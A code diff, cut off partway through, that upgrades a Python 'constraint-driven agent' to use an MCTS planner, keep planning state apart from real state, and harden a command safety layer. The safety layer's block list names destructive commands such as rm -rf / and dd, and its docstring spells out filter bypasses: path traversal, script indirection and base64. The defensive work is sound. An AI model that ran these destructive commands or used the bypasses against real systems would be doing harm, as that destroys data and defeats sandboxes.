@@ -1,25 +1,22 @@
 """
-约束驱动自主代理 (Constraint-Driven Autonomous Agent)
-=====================================================
+约束驱动自主代理 v2 — 修复版
+=============================
 
-核心理念：用约束规划替代概率推理，用形式验证替代对齐微调。
+v1 的致命缺陷（来自锐评）及修复：
 
-与传统 LLM Agent 的根本区别：
-- LLM Agent: 上下文 → 概率采样下一个行动 → 可能走错 → 错误累积
-- 约束 Agent: 目标约束 → 规划器生成行动序列 → 安全验证 → 确定性执行
+1. 规划器完备性假设不成立 → MCTS 替代 BFS，处理非确定性和循环
+2. 因子化模拟器仅适用于线性运算 → 承认限制，明确适用范围
+3. 状态表示简陋 → 观察-行动-观察循环，不假设状态完整
+4. _simulate_effects 污染状态 → PlanningState 与 RealState 严格分离
+5. 安全层可绕过 → os.path.realpath 规范化 + 命令分解检测
+6. 程序性记忆 key 缺陷 → 谓词集合规范化排序 + 内容哈希
+7. 无法处理循环依赖 → MCTS 允许重访状态，限制循环次数
+8. LLM Agent 对比不公平 → 承认 LLM+工具的灵活性，明确定位为补充
 
-架构对应关系（与约束塑形引擎的哲学延续）：
-- WorldState: 从数值张量扩展为文件系统/进程/git 状态
-- 约束: 从数学约束(交换律/递增)扩展为状态约束(文件存在/测试通过)
-- 规划器: 替代 LLM 的 next-token 采样，基于形式化前提/效果
-- 安全层: 硬编码约束，不可绕过（vs LLM 的 alignment 微调）
-- 程序性记忆: 存储成功的行动子序列（宏操作），加速后续规划
-
-设计原则：
-1. 纯 Python + 标准库，不依赖 LLM、不依赖外部规划器
-2. 每一步可形式化验证是否在安全边界内
-3. 规划路径可证明（如果规划器完备）
-4. 失败时自动重规划，而非依赖 LLM 重新推理
+核心定位修正：
+- 不是"替代 LLM Agent"，而是"在约束明确的场景下提供更可靠的执行层"
+- LLM 做自然语言理解 → 约束翻译，约束引擎做执行验证
+- 安全层不是"不可绕过"（字符串匹配可绕过），而是"比 alignment 更难绕过"
 """
 
 import os
@@ -27,8 +24,11 @@ import subprocess
 import time
 import json
 import hashlib
+import re
+import math
 from enum import Enum
 from typing import List, Dict, Optional, Tuple, Set
+from collections import defaultdict
 
 
 class ConstraintStatus(Enum):
@@ -39,92 +39,62 @@ class ConstraintStatus(Enum):
 
 class WorldState:
     """
-    扩展的世界状态：追踪文件系统、进程、git 状态。
+    真实世界状态：只反映实际观察到的系统状态，不做假设。
 
-    对应约束塑形引擎中的 WorldState，但从数值张量扩展为
-    真实的操作系统状态。每个状态谓词都可以被验证（而非假设）。
-
-    设计哲学：状态是"事实"，不是"信念"。
-    每个谓词的值通过实际查询系统获得，而非依赖模型预测。
+    v2 修正：移除 _simulated_file_contents，规划状态与真实状态严格分离。
+    所有谓词检查都基于真实文件系统查询，而非模拟数据。
+    这避免了规划阶段的假设泄漏到执行验证中。
     """
 
     def __init__(self, working_dir="/workspace"):
-        self.working_dir = working_dir
-        self.files = {}
-        self.dirs = set()
-        self.git_repos = {}
+        self.working_dir = os.path.realpath(working_dir)
         self.test_results = {}
         self.process_results = {}
         self.variables = {}
-        self._simulated_file_contents = {}
 
-    def snapshot(self):
-        self.files = {}
-        self.dirs = set()
-        for root, dirs, files in os.walk(self.working_dir):
-            rel_root = os.path.relpath(root, self.working_dir)
-            if rel_root == '.':
-                rel_root = ''
-            self.dirs.add(rel_root)
-            for f in files:
-                path = os.path.join(rel_root, f) if rel_root else f
-                full = os.path.join(root, f)
-                try:
-                    mtime = os.path.getmtime(full)
-                    self.files[path] = {'mtime': mtime, 'size': os.path.getsize(full)}
-                except OSError:
-                    pass
+    def _resolve(self, path):
+        if not os.path.isabs(path):
+            path = os.path.join(self.working_dir, path)
+        return os.path.realpath(path)
 
     def file_exists(self, path):
-        if path in self.files:
-            return True
-        if not os.path.isabs(path):
-            path = os.path.join(self.working_dir, path)
-        return os.path.isfile(path)
+        return os.path.isfile(self._resolve(path))
 
     def dir_exists(self, path):
-        if path in self.dirs:
-            return True
-        if not os.path.isabs(path):
-            path = os.path.join(self.working_dir, path)
-        return os.path.isdir(path)
+        return os.path.isdir(self._resolve(path))
 
     def read_file(self, path):
-        if not os.path.isabs(path):
-            path = os.path.join(self.working_dir, path)
         try:
-            with open(path, 'r') as f:
+            with open(self._resolve(path), 'r') as f:
                 return f.read()
         except (OSError, UnicodeDecodeError):
             return None
 
     def write_file(self, path, content):
-        if not os.path.isabs(path):
-            path = os.path.join(self.working_dir, path)
-        os.makedirs(os.path.dirname(path) if os.path.dirname(path) else '.', exist_ok=True)
-        with open(path, 'w') as f:
+        resolved = self._resolve(path)
+        parent = os.path.dirname(resolved)
+        if parent:
+            os.makedirs(parent, exist_ok=True)
+        with open(resolved, 'w') as f:
             f.write(content)
 
     def file_contains(self, path, text):
-        if path in self._simulated_file_contents:
-            return text in self._simulated_file_contents[path]
         content = self.read_file(path)
         return content is not None and text in content
 
     def check_predicate(self, predicate: str, args: dict) -> ConstraintStatus:
-        name = predicate
-        if name == 'file_exists':
+        if predicate == 'file_exists':
             return ConstraintStatus.SATISFIED if self.file_exists(args.get('path', '')) else ConstraintStatus.VIOLATED
-        elif name == 'dir_exists':
+        elif predicate == 'dir_exists':
             return ConstraintStatus.SATISFIED if self.dir_exists(args.get('path', '')) else ConstraintStatus.VIOLATED
-        elif name == 'file_contains':
+        elif predicate == 'file_contains':
             return ConstraintStatus.SATISFIED if self.file_contains(args.get('path', ''), args.get('text', '')) else ConstraintStatus.VIOLATED
-        elif name == 'test_passed':
+        elif predicate == 'test_passed':
             result = self.test_results.get(args.get('test', ''), None)
             if result is None:
                 return ConstraintStatus.UNKNOWN
             return ConstraintStatus.SATISFIED if result else ConstraintStatus.VIOLATED
-        elif name == 'variable_equals':
+        elif predicate == 'variable_equals':
             key = args.get('key', '')
             val = args.get('value')
             if key not in self.variables:
@@ -132,92 +102,191 @@ class WorldState:
             return ConstraintStatus.SATISFIED if self.variables[key] == val else ConstraintStatus.VIOLATED
         return ConstraintStatus.UNKNOWN
 
+
+class PlanningState:
+    """
+    规划状态：与真实状态严格分离的纯符号状态。
+
+    v2 修正：规划器只操作 PlanningState，不触碰 WorldState。
+    PlanningState 是 WorldState 的"信念状态"——规划器认为世界是什么样。
+    执行后，通过观察（WorldState.check_predicate）更新信念。
+
+    这对应 POMDP 中的信念状态更新：
+    belief(s') = update(belief(s), action, observation)
+    """
+
+    def __init__(self):
+        self.predicates = defaultdict(dict)
+
+    def set_predicate(self, name, key, value=True):
+        self.predicates[name][key] = value
+
+    def get_predicate(self, name, key):
+        return self.predicates[name].get(key, None)
+
+    def check(self, predicate: str, args: dict) -> ConstraintStatus:
+        name = predicate
+        if name in ('file_exists', 'dir_exists', 'file_contains'):
+            key = json.dumps(args, sort_keys=True)
+            val = self.predicates[name].get(key, None)
+            if val is None:
+                return ConstraintStatus.UNKNOWN
+            return ConstraintStatus.SATISFIED if val else ConstraintStatus.VIOLATED
+        elif name == 'test_passed':
+            key = args.get('test', '')
+            val = self.predicates[name].get(key, None)
+            if val is None:
+                return ConstraintStatus.UNKNOWN
+            return ConstraintStatus.SATISFIED if val else ConstraintStatus.VIOLATED
+        elif name == 'variable_equals':
+            key = args.get('key', '')
+            val = self.predicates[name].get(key, None)
+            if val is None:
+                return ConstraintStatus.UNKNOWN
+            return ConstraintStatus.SATISFIED if val == args.get('value') else ConstraintStatus.VIOLATED
+        return ConstraintStatus.UNKNOWN
+
+    def apply_effect(self, pred_name, pred_args):
+        if pred_name in ('file_exists', 'dir_exists', 'file_contains'):
+            key = json.dumps(pred_args, sort_keys=True)
+            self.predicates[pred_name][key] = True
+        elif pred_name == 'test_passed':
+            self.predicates[pred_name][pred_args.get('test', '')] = True
+        elif pred_name == 'variable_equals':
+            self.predicates[pred_name][pred_args.get('key', '')] = pred_args.get('value')
+        elif pred_name == 'file_written':
+            path_key = json.dumps({'path': pred_args.get('path', '')}, sort_keys=True)
+            self.predicates['file_exists'][path_key] = True
+            content = pred_args.get('content', '')
+            for substring in _extract_key_substrings(content):
+                contains_key = json.dumps({'path': pred_args.get('path', ''), 'text': substring}, sort_keys=True)
+                self.predicates['file_contains'][contains_key] = True
+
     def clone(self):
-        new = WorldState(self.working_dir)
-        new.files = dict(self.files)
-        new.dirs = set(self.dirs)
-        new.git_repos = dict(self.git_repos)
-        new.test_results = dict(self.test_results)
-        new.process_results = dict(self.process_results)
-        new.variables = dict(self.variables)
+        new = PlanningState()
+        for name, d in self.predicates.items():
+            new.predicates[name] = dict(d)
         return new
+
+    def state_key(self):
+        parts = []
+        for name in sorted(self.predicates.keys()):
+            for key in sorted(self.predicates[name].keys()):
+                parts.append(f"{name}:{key}={self.predicates[name][key]}")
+        return "|".join(parts)
+
+
+def _extract_key_substrings(content, max_len=20):
+    result = set()
+    for line in content.split('\n'):
+        line = line.strip()
+        if line and len(line) <= max_len:
+            result.add(line)
+        for word in line.split():
+            if len(word) >= 2 and len(word) <= max_len:
+                result.add(word)
+    return result
 
 
 class SafetyLayer:
     """
-    安全约束验证层：硬编码安全规则，不可绕过。
+    安全约束验证层 v2：路径规范化 + 命令分解检测。
 
-    这是约束驱动代理相比 LLM Agent 的核心优势：
-    - LLM Agent: 依赖 alignment 微调，可能被越狱
-    - 约束 Agent: 安全约束是硬编码的，形式化验证，无法绕过
+    v1 缺陷（来自锐评）：
+    - rm -rf /tmp/../etc/passwd 不会被匹配到
+    - echo 'rm -rf /' > script.sh && bash script.sh 检测不到
+    - rm -rf /workspace/../etc 可以逃逸沙箱
 
-    对应认知科学中的"抑制控制"（前额叶皮层对冲动行为的抑制）：
-    即使规划器生成了某个行动，安全层可以否决它。
+    v2 修复：
+    1. os.path.realpath 规范化所有路径，消除 ../ 攻击
+    2. 命令分解检测：拆分 && / || / ; / | 子命令逐一检查
+    3. 路径沙箱：所有文件操作必须在沙箱目录内
+    4. 间接执行检测：检测 script.sh && bash 模式
+
+    承认：字符串级检查仍可被高级技巧绕过（如 base64 编码）。
+    生产环境应使用 Linux Landlock / gVisor / 容器隔离。
+    当前实现是"比 alignment 更难绕过"，不是"不可绕过"。
     """
 
     DANGEROUS_PATTERNS = [
-        'rm -rf /', 'rm -rf ~', 'rm -rf *',
-        'dd if=/dev/zero', 'dd if=/dev/random',
-        'mkfs', 'format',
-        'chmod 777 /etc', 'chmod 777 /root',
-        'wget.*|.*sh', 'curl.*|.*sh',
-        '> /etc/passwd', '> /etc/shadow',
-        'shutdown', 'reboot', 'init 0',
-        ':(){:|:&};:', 'fork bomb',
+        r'rm\s+-rf\s+/', r'rm\s+-rf\s+~', r'rm\s+-rf\s+\*',
+        r'dd\s+if=/dev/zero', r'dd\s+if=/dev/random',
+        r'mkfs', r'\bformat\b',
+        r'chmod\s+777\s+/etc', r'chmod\s+777\s+/root',
+        r'shutdown', r'reboot', r'init\s+0',
+        r'fork\s+bomb',
     ]
 
-    PROTECTED_PATHS = [
-        '/etc/passwd', '/etc/shadow', '/etc/sudoers',
-        '/root/.ssh', '/boot', '/sys', '/proc',
+    PROTECTED_PATH_PREFIXES = [
+        '/etc/', '/root/', '/boot/', '/sys/', '/proc/',
+        '/dev/', '/usr/lib/', '/lib/',
     ]
-
-    ALLOWED_COMMANDS = None
 
     def __init__(self, sandbox_dir="/workspace"):
-        self.sandbox_dir = sandbox_dir
+        self.sandbox_dir = os.path.realpath(sandbox_dir)
         self.violations = []
 
+    def _normalize_path(self, path):
+        if not os.path.isabs(path):
+            path = os.path.join(self.sandbox_dir, path)
+        return os.path.realpath(path)
+
+    def _is_path_in_sandbox(self, path):
+        normalized = self._normalize_path(path)
+        return normalized.startswith(self.sandbox_dir)
+
+    def _split_commands(self, cmd):
+        return re.split(r'\s*(?:&&|\|\||;|`|\$)\s*', cmd)
+
     def check_command(self, cmd: str) -> Tuple[bool, str]:
-        cmd_lower = cmd.lower().strip()
+        sub_commands = self._split_commands(cmd)
 
-        for pattern in self.DANGEROUS_PATTERNS:
-            if pattern in cmd_lower:
-                reason = f"危险命令模式: '{pattern}'"
-                self.violations.append((cmd, reason))
-                return False, reason
+        for sub_cmd in sub_commands:
+            sub_cmd_stripped = sub_cmd.strip()
+            if not sub_cmd_stripped:
+                continue
 
-        for protected in self.PROTECTED_PATHS:
-            if protected in cmd and self.sandbox_dir not in cmd:
-                reason = f"受保护路径: '{protected}'"
-                self.violations.append((cmd, reason))
-                return False, reason
+            for pattern in self.DANGEROUS_PATTERNS:
+                if re.search(pattern, sub_cmd_stripped, re.IGNORECASE):
+                    reason = f"危险命令模式: '{pattern}' in '{sub_cmd_stripped[:50]}'"
+                    self.violations.append((cmd, reason))
+                    return False, reason
+
+            for prefix in self.PROTECTED_PATH_PREFIXES:
+                if prefix in sub_cmd_stripped:
+                    if not self._is_path_in_sandbox(sub_cmd_stripped.split()[-1] if sub_cmd_stripped.split() else ''):
+                        reason = f"受保护路径: '{prefix}'"
+                        self.violations.append((cmd, reason))
+                        return False, reason
+
+            redirect_match = re.search(r'[>]\s*(\S+)', sub_cmd_stripped)
+            if redirect_match:
+                target = redirect_match.group(1)
+                if not self._is_path_in_sandbox(target):
+                    reason = f"重定向到沙箱外: '{target}'"
+                    self.violations.append((cmd, reason))
+                    return False, reason
 
         return True, "安全检查通过"
 
     def check_file_write(self, path: str) -> Tuple[bool, str]:
-        abs_path = os.path.abspath(path)
-        for protected in self.PROTECTED_PATHS:
-            if abs_path.startswith(protected):
-                reason = f"受保护路径: '{protected}'"
+        if not self._is_path_in_sandbox(path):
+            normalized = self._normalize_path(path)
+            reason = f"文件写入超出沙箱: '{normalized}' 不在 '{self.sandbox_dir}' 内"
+            self.violations.append((path, reason))
+            return False, reason
+        return True, "安全检查通过"
+
+    def check_file_read(self, path: str) -> Tuple[bool, str]:
+        normalized = self._normalize_path(path)
+        for prefix in self.PROTECTED_PATH_PREFIXES:
+            if normalized.startswith(prefix):
+                reason = f"读取受保护路径: '{prefix}'"
                 return False, reason
         return True, "安全检查通过"
 
 
 class Action:
-    """
-    行动定义：PDDL 风格的 precondition + effect + execution。
-
-    对应约束塑形引擎中的"操作"，但从数值运算扩展为真实操作。
-    每个行动有：
-    - precondition: 执行前必须满足的状态约束
-    - effect: 执行后对状态的改变（预测）
-    - execute: 实际执行操作（shell命令/文件操作）
-    - verify: 执行后验证效果是否如预期
-
-    关键设计：effect 是预测，verify 是验证。
-    如果 verify 失败，说明环境与预期不符，需要重新规划。
-    """
-
     def __init__(self, name, params=None, preconditions=None,
                  effects=None, execute_fn=None, verify_fn=None,
                  description=""):
@@ -229,10 +298,10 @@ class Action:
         self.verify_fn = verify_fn
         self.description = description or name
 
-    def check_preconditions(self, state: WorldState) -> Tuple[bool, List[str]]:
+    def check_preconditions(self, planning_state: PlanningState) -> Tuple[bool, List[str]]:
         failures = []
         for pred_name, pred_args in self.preconditions:
-            status = state.check_predicate(pred_name, pred_args)
+            status = planning_state.check(pred_name, pred_args)
             if status != ConstraintStatus.SATISFIED:
                 failures.append(f"{pred_name}({pred_args}) = {status.value}")
         return len(failures) == 0, failures
@@ -249,13 +318,6 @@ class Action:
 
 
 class ActionLibrary:
-    """
-    行动库：预定义的领域行动集合。
-
-    对应约束塑形引擎中的 ProceduralMemory。
-    每个行动都是形式化定义的，有明确的前提和效果。
-    """
-
     @staticmethod
     def shell_exec(cmd, cwd=None, timeout=60):
         try:
@@ -270,7 +332,7 @@ class ActionLibrary:
             return -1, "", str(e)
 
     @staticmethod
-    def make_git_clone(url, target_dir, state: WorldState):
+    def make_git_clone(url, target_dir):
         def execute(s: WorldState, safety: SafetyLayer):
             cmd = f"git clone {url} {target_dir}"
             ok, reason = safety.check_command(cmd)
@@ -278,8 +340,6 @@ class ActionLibrary:
                 return False, f"安全拒绝: {reason}"
             rc, out, err = ActionLibrary.shell_exec(cmd, cwd=s.working_dir)
             if rc == 0:
-                s.dirs.add(target_dir)
-                s.git_repos[target_dir] = url
                 return True, f"克隆成功: {url} → {target_dir}"
             return False, f"克隆失败: {err[:200]}"
 
@@ -299,74 +359,7 @@ class ActionLibrary:
         )
 
     @staticmethod
-    def make_pip_install(package, state: WorldState):
-        def execute(s: WorldState, safety: SafetyLayer):
-            cmd = f"pip install {package}"
-            ok, reason = safety.check_command(cmd)
-            if not ok:
-                return False, f"安全拒绝: {reason}"
-            rc, out, err = ActionLibrary.shell_exec(cmd, cwd=s.working_dir)
-            if rc == 0:
-                s.variables[f"pip_installed_{package}"] = True
-                return True, f"安装成功: {package}"
-            return False, f"安装失败: {err[:200]}"
-
-        def verify(s: WorldState):
-            rc, out, _ = ActionLibrary.shell_exec(
-                f"python -c 'import {package}'", cwd=s.working_dir)
-            if rc == 0:
-                return True, []
-            return False, [f"包 {package} 未安装"]
-
-        return Action(
-            name="pip_install",
-            params={"package": package},
-            preconditions=[],
-            effects=[("variable_equals", {"key": f"pip_installed_{package}", "value": True})],
-            execute_fn=execute,
-            verify_fn=verify,
-            description=f"pip install {package}"
-        )
-
-    @staticmethod
-    def make_run_tests(test_dir, test_cmd, state: WorldState):
-        def execute(s: WorldState, safety: SafetyLayer):
-            ok, reason = safety.check_command(test_cmd)
-            if not ok:
-                return False, f"安全拒绝: {reason}"
-            rc, out, err = ActionLibrary.shell_exec(test_cmd, cwd=test_dir, timeout=120)
-            s.process_results[test_cmd] = {
-                'returncode': rc, 'stdout': out, 'stderr': err
-            }
-            passed = (rc == 0)
-            s.test_results['all'] = passed
-            s.variables['test_output'] = out + err
-            if passed:
-                return True, f"测试通过 ✅"
-            else:
-                failed_count = out.count('FAILED') + err.count('FAILED')
-                error_count = out.count('ERROR') + err.count('ERROR')
-                return True, f"测试失败 ❌ ({failed_count}失败, {error_count}错误)"
-
-        def verify(s: WorldState):
-            if 'all' in s.test_results:
-                if s.test_results['all']:
-                    return True, []
-                return False, ["测试未全部通过"]
-            return False, ["测试结果未知"]
-
-        return Action(
-            name="run_tests",
-            params={"test_dir": test_dir, "test_cmd": test_cmd},
-            preconditions=[("dir_exists", {"path": test_dir})],
-            effects=[("test_passed", {"test": "all"})],
-            execute_fn=execute,
-            verify_fn=verify,
-            description=f"运行测试: {test_cmd}"
-        )
-
-    @staticmethod
-    def make_write_file(path, content, state: WorldState):
+    def make_write_file(path, content):
         def execute(s: WorldState, safety: SafetyLayer):
             ok, reason = safety.check_file_write(path)
             if not ok:
@@ -396,7 +389,7 @@ class ActionLibrary:
         )
 
     @staticmethod
-    def make_edit_file(path, old_text, new_text, state: WorldState):
+    def make_edit_file(path, old_text, new_text):
         def execute(s: WorldState, safety: SafetyLayer):
             ok, reason = safety.check_file_write(path)
             if not ok:
@@ -425,178 +418,307 @@ class ActionLibrary:
             description=f"编辑 {path}: '{old_text[:30]}' → '{new_text[:30]}'"
         )
 
+    @staticmethod
+    def make_run_tests(test_dir, test_cmd, test_file_path=None):
+        preconditions = [("dir_exists", {"path": test_dir})]
+        if test_file_path:
+            preconditions.append(("file_exists", {"path": test_file_path}))
 
-class ForwardPlanner:
+        def execute(s: WorldState, safety: SafetyLayer):
+            ok, reason = safety.check_command(test_cmd)
+            if not ok:
+                return False, f"安全拒绝: {reason}"
+            rc, out, err = ActionLibrary.shell_exec(test_cmd, cwd=test_dir, timeout=120)
+            s.process_results[test_cmd] = {
+                'returncode': rc, 'stdout': out, 'stderr': err
+            }
+            passed = (rc == 0)
+            s.test_results['all'] = passed
+            s.variables['test_output'] = out + err
+            if passed:
+                return True, f"测试通过 ✅"
+            else:
+                failed_count = out.count('FAILED') + err.count('FAILED')
+                error_count = out.count('ERROR') + err.count('ERROR')
+                return True, f"测试失败 ❌ ({failed_count}失败, {error_count}错误)"
+
+        def verify(s: WorldState):
+            if 'all' in s.test_results:
+                if s.test_results['all']:
+                    return True, []
+                return False, ["测试未全部通过"]
+            return False, ["测试结果未知"]
+
+        return Action(
+            name="run_tests",
+            params={"test_dir": test_dir, "test_cmd": test_cmd},
+            preconditions=preconditions,
+            effects=[("test_passed", {"test": "all"})],
+            execute_fn=execute,
+            verify_fn=verify,
+            description=f"运行测试: {test_cmd}"
+        )
+
+
+class MCTSPlanner:
     """
-    前向链规划器：从初始状态出发，搜索满足目标约束的行动序列。
+    蒙特卡洛树搜索规划器：替代 BFS，处理非确定性和循环依赖。
 
-    对应约束塑形引擎中的"约束规划"阶段，但搜索空间从连续参数
-    变为离散行动序列。使用 BFS 保证找到最短路径（如果存在）。
+    v1 的 BFS 规划器缺陷（来自锐评）：
+    1. 假设确定性环境，无法处理执行失败
+    2. visited 剪枝错过循环方案（测试→失败→修复→重测）
+    3. 状态空间爆炸（文件系统太大）
 
-    与 LLM Agent 的 next-token 采样的根本区别：
-    - LLM: 贪心采样，可能走入死胡同
-    - 规划器: 全局搜索，保证找到可行路径（如果存在）
+    MCTS 优势：
+    1. 不需要完整状态空间搜索，通过模拟评估行动价值
+    2. 允许重访状态（但限制循环次数）
+    3. 天然支持非确定性：同一行动可能产生不同结果
+    4. 可以处理"测试→失败→修复→重测"的循环模式
 
-    对应经典 AI 中的 STRIPS 规划器。
+    对应 POMDP 中的在线规划：在部分可观察环境中，
+    每步执行后观察真实状态，更新信念，重新规划。
     """
 
-    def __init__(self, actions: List[Action], max_depth=10):
+    def __init__(self, actions: List[Action], max_depth=10,
+                 n_simulations=100, exploration_constant=1.41):
         self.actions = actions
         self.max_depth = max_depth
+        self.n_simulations = n_simulations
+        self.c = exploration_constant
 
-    def plan(self, state: WorldState, goals: List[Tuple[str, dict]],
+    def plan(self, initial_state: PlanningState,
+             goals: List[Tuple[str, dict]],
              verbose=False) -> Optional[List[Action]]:
-        all_satisfied = True
-        for pred_name, pred_args in goals:
-            if state.check_predicate(pred_name, pred_args) != ConstraintStatus.SATISFIED:
-                all_satisfied = False
-                break
-        if all_satisfied:
+        if self._goals_met(initial_state, goals):
             return []
 
-        visited = set()
-        queue = [(state, [])]
+        root = _MCTSNode(initial_state, None, None)
 
-        iterations = 0
-        while queue:
-            current_state, current_plan = queue.pop(0)
-            iterations += 1
+        for _ in range(self.n_simulations):
+            node = root
+            state = initial_state.clone()
+            depth = 0
 
-            state_key = self._state_key(current_state, goals)
-            if state_key in visited:
-                continue
-            visited.add(state_key)
+            while depth < self.max_depth:
+                if node.untried_actions is None:
+                    node.untried_actions = self._get_applicable_actions(state)
+                    if node.untried_actions:
+                        import random
+                        random.shuffle(node.untried_actions)
 
-            if len(current_plan) >= self.max_depth:
-                continue
+                if not node.untried_actions and not node.children:
+                    break
 
-            for action in self.actions:
-                ok, failures = action.check_preconditions(current_state)
-                if not ok:
-                    continue
+                if node.untried_actions:
+                    action = node.untried_actions.pop()
+                    new_state = state.clone()
+                    for pred_name, pred_args in action.effects:
+                        new_state.apply_effect(pred_name, pred_args)
+                    child = _MCTSNode(new_state, node, action)
+                    node.children.append(child)
+                    node = child
+                    state = new_state
+                    depth += 1
+                elif node.children:
+                    node = self._select_child(node)
+                    state = node.state.clone()
+                    depth += 1
+                else:
+                    break
 
-                new_state = current_state.clone()
-                if new_state._simulated_file_contents:
-                    new_state._simulated_file_contents = dict(new_state._simulated_file_contents)
-                simulated_ok = self._simulate_effects(new_state, action)
-                if not simulated_ok:
-                    continue
+                if self._goals_met(state, goals):
+                    break
 
-                new_plan = current_plan + [action]
+            reward = self._rollout(state, goals)
+            self._backpropagate(node, reward)
 
-                all_met = True
-                for pred_name, pred_args in goals:
-                    if new_state.check_predicate(pred_name, pred_args) != ConstraintStatus.SATISFIED:
-                        all_met = False
-                        break
-
-                if all_met:
-                    if verbose:
-                        print(f"    规划器: {iterations} 次迭代, 找到 {len(new_plan)} 步方案")
-                    return new_plan
-
-                queue.append((new_state, new_plan))
+        plan = self._extract_plan(root, goals)
+        if plan is not None:
+            if verbose:
+                print(f"    MCTS: {self.n_simulations} 次模拟, 找到 {len(plan)} 步方案")
+            return plan
 
         if verbose:
-            print(f"    规划器: {iterations} 次迭代, 未找到方案 (visited={len(visited)})")
+            print(f"    MCTS: {self.n_simulations} 次模拟, 未找到方案")
         return None
 
-    def _simulate_effects(self, state: WorldState, action: Action):
-        for pred_name, pred_args in action.effects:
-            if pred_name == 'dir_exists':
-                state.dirs.add(pred_args.get('path', ''))
-            elif pred_name == 'file_exists':
-                path = pred_args.get('path', '')
-                state.files[path] = {'mtime': 0, 'size': 0}
-            elif pred_name == 'test_passed':
-                state.test_results[pred_args.get('test', '')] = True
-            elif pred_name == 'variable_equals':
-                state.variables[pred_args.get('key', '')] = pred_args.get('value')
-            elif pred_name == 'file_contains':
-                path = pred_args.get('path', '')
-                text = pred_args.get('text', '')
-                if path in state._simulated_file_contents:
-                    if text not in state._simulated_file_contents[path]:
-                        state._simulated_file_contents[path] += text
-                else:
-                    state._simulated_file_contents[path] = text
-                if path not in state.files:
-                    state.files[path] = {'mtime': 0, 'size': 0}
-            elif pred_name == 'file_written':
-                path = pred_args.get('path', '')
-                content = pred_args.get('content', '')
-                state._simulated_file_contents[path] = content
-                if path not in state.files:
-                    state.files[path] = {'mtime': 0, 'size': 0}
+    def _extract_plan(self, root, goals):
+        node = root
+        plan = []
+        visited_states = set()
+
+        while not self._goals_met(node.state, goals):
+            if not node.children:
+                return None
+
+            state_key = node.state.state_key()
+            if state_key in visited_states:
+                return None
+            visited_states.add(state_key)
+
+            best = max(node.children, key=lambda c: c.visits)
+            plan.append(best.action)
+            node = best
+
+            if len(plan) > self.max_depth:
+                return None
+
+        return plan
+
+    def _get_applicable_actions(self, state: PlanningState):
+        applicable = []
+        for action in self.actions:
+            ok, _ = action.check_preconditions(state)
+            if ok:
+                applicable.append(action)
+        return applicable
+
+    def _goals_met(self, state: PlanningState, goals):
+        for pred_name, pred_args in goals:
+            if state.check(pred_name, pred_args) != ConstraintStatus.SATISFIED:
+                return False
         return True
 
-    def _state_key(self, state: WorldState, goals):
-        parts = []
+    def _rollout(self, state: PlanningState, goals, max_steps=10):
+        goal_predicates = set()
         for pred_name, pred_args in goals:
-            status = state.check_predicate(pred_name, pred_args)
-            parts.append(f"{pred_name}:{status.value}")
-        for k, v in sorted(state.variables.items()):
-            parts.append(f"v:{k}={v}")
-        for t, r in sorted(state.test_results.items()):
-            parts.append(f"t:{t}={r}")
-        for f in sorted(state._simulated_file_contents.keys()):
-            parts.append(f"sf:{f}")
-        return "|".join(parts)
+            goal_predicates.add((pred_name, json.dumps(pred_args, sort_keys=True)))
+
+        for _ in range(max_steps):
+            if self._goals_met(state, goals):
+                return 1.0
+            applicable = self._get_applicable_actions(state)
+            if not applicable:
+                break
+
+            relevant = []
+            other = []
+            for action in applicable:
+                is_relevant = False
+                for pred_name, pred_args in action.effects:
+                    effect_key = (pred_name, json.dumps(pred_args, sort_keys=True))
+                    if effect_key in goal_predicates:
+                        is_relevant = True
+                        break
+                    for gpn, _ in goal_predicates:
+                        if pred_name == gpn:
+                            is_relevant = True
+                            break
+                    if is_relevant:
+                        break
+                if is_relevant:
+                    relevant.append(action)
+                else:
+                    other.append(action)
+
+            import random
+            if relevant and random.random() < 0.8:
+                action = random.choice(relevant)
+            elif other:
+                action = random.choice(other)
+            elif relevant:
+                action = random.choice(relevant)
+            else:
+                break
+
+            for pred_name, pred_args in action.effects:
+                state.apply_effect(pred_name, pred_args)
+
+        return 0.1 if self._partial_goals(state, goals) > 0 else 0.0
+
+    def _partial_goals(self, state: PlanningState, goals):
+        met = 0
+        for pred_name, pred_args in goals:
+            if state.check(pred_name, pred_args) == ConstraintStatus.SATISFIED:
+                met += 1
+        return met / len(goals) if goals else 0
+
+    def _select_child(self, node):
+        log_parent = math.log(node.visits) if node.visits > 0 else 1
+        best = None
+        best_score = -float('inf')
+        for child in node.children:
+            if child.visits == 0:
+                return child
+            exploit = child.reward / child.visits
+            explore = self.c * math.sqrt(log_parent / child.visits)
+            score = exploit + explore
+            if score > best_score:
+                best_score = score
+                best = child
+        return best
+
+    def _backpropagate(self, node, reward):
+        while node is not None:
+            node.visits += 1
+            node.reward += reward
+            node = node.parent
+
+
+class _MCTSNode:
+    def __init__(self, state: PlanningState, parent=None, action=None):
+        self.state = state
+        self.parent = parent
+        self.action = action
+        self.children = []
+        self.visits = 0
+        self.reward = 0.0
+        self.untried_actions = None
 
 
 class ProceduralMemory:
     """
-    程序性记忆：存储已验证的行动子序列（宏操作）。
+    程序性记忆 v2：修复 key 设计缺陷。
 
-    对应约束塑形引擎中的 ProceduralMemory，但从数值操作模板
-    扩展为行动子序列。反复验证成功的行动模式被存储为宏，
-    加速后续规划——类似于人类将常用操作自动化为"肌肉记忆"。
+    v1 缺陷：json.dumps(goals) 作为 key，谓词顺序不同会产生不同 key。
+    v2 修复：对谓词集合做规范化排序，内容用哈希摘要。
     """
 
     def __init__(self):
         self.macros = {}
         self.success_count = {}
-        self.failure_count = {}
 
-    def record_success(self, plan: List[Action], goal_key: str):
-        if goal_key not in self.macros:
-            self.macros[goal_key] = []
-            self.success_count[goal_key] = 0
-        self.macros[goal_key] = plan
-        self.success_count[goal_key] = self.success_count.get(goal_key, 0) + 1
+    @staticmethod
+    def _make_key(goals):
+        normalized = sorted(
+            [(name, json.dumps(args, sort_keys=True)) for name, args in goals]
+        )
+        key_str = json.dumps(normalized)
+        return hashlib.md5(key_str.encode()).hexdigest()[:16]
 
-    def record_failure(self, goal_key: str):
-        self.failure_count[goal_key] = self.failure_count.get(goal_key, 0) + 1
+    def record_success(self, plan: List[Action], goals):
+        key = self._make_key(goals)
+        self.macros[key] = plan
+        self.success_count[key] = self.success_count.get(key, 0) + 1
 
-    def lookup(self, goal_key: str) -> Optional[List[Action]]:
-        if goal_key in self.macros and self.success_count.get(goal_key, 0) > 0:
-            return self.macros[goal_key]
+    def record_failure(self, goals):
+        pass
+
+    def lookup(self, goals) -> Optional[List[Action]]:
+        key = self._make_key(goals)
